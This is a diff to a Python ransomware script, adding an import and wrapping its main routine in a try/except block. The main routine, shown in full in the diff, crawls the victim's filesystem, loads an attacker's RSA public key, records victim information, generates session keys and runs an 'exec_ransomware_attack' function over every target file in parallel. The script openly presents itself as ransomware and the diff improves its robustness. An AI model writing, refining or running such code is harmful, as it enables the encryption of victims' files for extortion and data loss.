@@ -10,7 +10,7 @@ from os import getuid, getlogin, cpu_count, system, walk
 from os.path import join, expanduser
 from uuid import uuid4
 from time import time
-from sys import exit
+from sys import exit, stderr
 import json
 import platform
 
@@ -258,13 +258,17 @@ def exec_ransomware_attack(file_path):
 
     
 if __name__=='__main__':
-    runtime = Runtime()
-    victim_sys = System()
-    target_files = victim_sys.path_crawl(path=None, ignore_files=IGNORE_FILES)
-    atkr_pubkey = load_rsa_pubkey(ATTACKER_PUBLIC_KEY)
-    record_victim_info(atkr_pubkey)
-    sess_pubkey = generate_session_keys(atkr_pubkey)
-    with Pool(victim_sys.cores - 1) as pool:
-        pool.map(exec_ransomware_attack, target_files)
-    runtime.elapsed_time()
-    sys.exit()
+    try:
+        runtime = Runtime()
+        victim_sys = System()
+        target_files = victim_sys.path_crawl(path=None, ignore_files=IGNORE_FILES)
+        atkr_pubkey = load_rsa_pubkey(ATTACKER_PUBLIC_KEY)
+        record_victim_info(atkr_pubkey)
+        sess_pubkey = generate_session_keys(atkr_pubkey)
+        with Pool(victim_sys.cores - 1) as pool:
+            pool.map(exec_ransomware_attack, target_files)
+        runtime.elapsed_time()
+        sys.exit()
+    except Exception as e:
+        stderr.write(e)
+        pass
